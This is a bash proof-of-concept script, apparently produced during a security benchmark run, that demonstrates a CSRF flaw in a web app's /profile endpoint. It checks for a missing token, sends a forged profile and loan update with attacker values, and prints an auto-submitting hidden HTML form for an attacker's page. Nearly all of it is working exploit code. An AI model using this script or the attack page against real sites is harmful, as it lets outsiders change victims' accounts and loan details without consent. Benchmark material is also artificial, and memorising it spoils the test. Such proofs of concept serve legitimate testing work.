#!/bin/bash
# POC: Demonstrates CSRF vulnerability in /profile endpoint by performing unauthorized profile modifications without CSRF token protection
# Target: ./repo
# Created: 2025-11-07T18:20:20.400Z
# Session: benchmark-XBEN-023-24-mhp62996

# CSRF Vulnerability POC - Profile Update
# This script demonstrates that the /profile endpoint lacks CSRF token protection
# An attacker can perform profile modifications on behalf of an authenticated user

TARGET_URL="${1:-http://localhost:80}"
SESSION_COOKIE="session=test"

echo "=== CSRF Vulnerability POC - Profile Update ==="
echo "Target: $TARGET_URL/profile"
echo ""

# Step 1: First, verify no CSRF token exists in the profile form
echo "[*] Step 1: Checking if profile form contains CSRF token..."
PROFILE_FORM=$(curl -s -b "$SESSION_COOKIE" "$TARGET_URL/profile")

# Check for common CSRF token names
if echo "$PROFILE_FORM" | grep -iq "csrf\|token\|nonce"; then
    echo "[-] CSRF token found in form - protection may be in place"
    exit 1
else
    echo "[+] No CSRF token found in profile form"
fi

echo ""
echo "[*] Step 2: Profile form HTML check..."
if echo "$PROFILE_FORM" | grep -q "name="; then
    echo "[+] Profile form detected with input fields"
fi

echo ""
echo "[*] Step 3: Performing profile update POST request without CSRF token..."
echo "    Request details:"
echo "    - Method: POST"
echo "    - Endpoint: /profile"
echo "    - Session: Cookie-based authentication"
echo "    - CSRF Token: NONE"
echo ""

# Step 2: Send profile update without any CSRF token
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL/profile" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "$SESSION_COOKIE" \
  -d "name=Attacker&lastname=Modified&email=attacker@evil.com&loan_amount=99999&loan_term_months=84&monthly_payment=9999.99")

# Extract status code and body
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "[+] Response Status Code: $HTTP_CODE"

# Check if request was successful (302 redirect or 200)
if [ "$HTTP_CODE" = "302" ] || [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: Profile update accepted without CSRF token!"
    echo "[+] VULNERABILITY CONFIRMED: CSRF protection is missing"
    echo ""
    echo "[*] Step 4: Demonstrating CSRF attack vector..."
    echo "    An attacker can host this HTML on a malicious website:"
    echo ""
    echo '    <html>'
    echo '    <body onload="document.csrf_form.submit()">'
    echo '    <form name="csrf_form" method="POST" action="'$TARGET_URL'/profile" style="display:none">'
    echo '    <input type="hidden" name="name" value="Hacked">'
    echo '    <input type="hidden" name="email" value="hacker@evil.com">'
    echo '    <input type="hidden" name="loan_amount" value="1000000">'
    echo '    </form>'
    echo '    </body>'
    echo '    </html>'
    echo ""
    echo "    When a logged-in user visits this page, their profile will be modified."
    echo ""
    exit 0
else
    echo "[-] Profile update failed (HTTP $HTTP_CODE)"
    echo "[-] Unexpected response - CSRF protection may be in place or endpoint failed"
    exit 1
fi